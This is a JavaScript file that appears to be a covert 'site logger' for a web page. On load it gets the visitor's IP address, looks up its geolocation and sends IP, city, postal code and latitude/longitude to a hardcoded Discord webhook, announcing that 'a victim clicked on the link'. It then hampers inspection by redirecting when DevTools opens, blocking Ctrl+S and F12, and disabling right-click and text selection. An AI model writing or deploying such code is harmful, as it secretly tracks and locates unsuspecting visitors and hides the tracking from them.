const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1400426279408500807/4VGOn9kW4kH-dk7hzb2gWr_D5SVAtj997UtXKf-LSayhf-X-8uUbzVD-rYwe-1JpCzN7'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "site logger <3", // optionally changeable
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();

// Prevent DevTools and Ctrl+S
let devtoolsDetected = false;
const redirectURL = 'https://example.com';  // Cseréld ki arra az oldalra, ahová át szeretnéd irányítani

// DevTools megnyitásának érzékelése a külső magasság változásával
function detectDevTools() {
    const threshold = 200;  // Küszöbérték, ami segít az eszközök érzékelésében
    const devtoolsOpen = window.outerHeight - window.innerHeight > threshold;
    if (devtoolsOpen && !devtoolsDetected) {
        devtoolsDetected = true;
        window.location.href = redirectURL;  // Átirányítás
    }
}

// DevTools érzékelése a `console.log` manipulálásával
(function() {
    const originalConsole = console.log;
    console.log = function(...args) {
        originalConsole.apply(console, args); // Még mindig logoljuk a konzolra
        if (args[0].includes('DevTools')) {
            window.location.href = redirectURL;  // Átirányítás, ha a DevTools be van kapcsolva
        }
    };
})();

setInterval(detectDevTools, 1000); // Minden másodpercben ellenőrzi a DevTools állapotát

// Ctrl+S letiltása (mentés)
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey && e.key === 's') || e.key === 'F12') {
        e.preventDefault(); // Letiltja a mentési próbálkozást (Ctrl+S vagy F12)
        window.location.href = redirectURL; // Átirányítja a felhasználót a kívánt oldalra
    }
});

// Jobb kattintás letiltása
document.addEventListener('contextmenu', function(e) {
    e.preventDefault(); // Letiltja a jobb kattintást
});

// Szövegkiválasztás letiltása
document.addEventListener('selectstart', function(e) {
    e.preventDefault(); // Letiltja a szövegkiválasztást
});
